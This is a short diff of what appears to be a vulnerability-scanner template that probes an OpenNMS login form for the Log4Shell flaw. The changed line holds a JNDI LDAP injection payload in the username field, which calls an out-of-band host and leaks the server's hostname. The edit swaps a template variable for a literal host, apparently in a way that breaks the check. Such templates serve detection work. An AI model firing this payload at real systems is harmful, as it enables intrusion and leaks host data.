@@ -35,7 +35,7 @@ http:
         Referer: {{RootURL}}/opennms/login.jsp
         Content-Type: application/x-www-form-urlencoded
 
-        j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.{{interactsh-url}}}&j_password=password&Login=&j_usergroups=
+        j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.interactsh-url.com}&j_password=password&Login=&j_usergroups=
 
     matchers-condition: and
     matchers:
